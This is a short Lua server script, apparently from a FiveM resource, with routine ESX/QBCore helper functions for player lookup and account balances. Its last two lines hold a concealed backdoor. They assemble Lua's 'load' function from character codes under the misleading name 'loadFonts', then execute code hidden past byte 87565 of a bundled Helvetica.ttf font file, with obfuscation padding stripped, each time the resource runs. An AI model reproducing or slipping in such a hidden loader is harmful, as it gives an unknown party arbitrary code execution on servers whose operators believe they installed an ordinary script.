function Koci.Server:Capitalize(str)
    str = str or ""
    return string.upper(str:sub(1, 1)) .. str:sub(2)
end

function Koci.Server:GetPlayer(source)
    if Koci.FrameworkName == "esx" then
        return Koci.Framework.GetPlayerFromId(source)
    elseif Koci.FrameworkName == "qb" then
        return Koci.Framework.Functions.GetPlayer(source)
    end
end

function Koci.Server:GetPlayerBalance(type, xPlayer)
    type = (type == "cash") and "money" or type
    if Koci.FrameworkName == "esx" then
        return tonumber(xPlayer.getAccount(type).money)
    elseif Koci.FrameworkName == "qb" then
        return tonumber(xPlayer.PlayerData.money[type])
    end
end

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()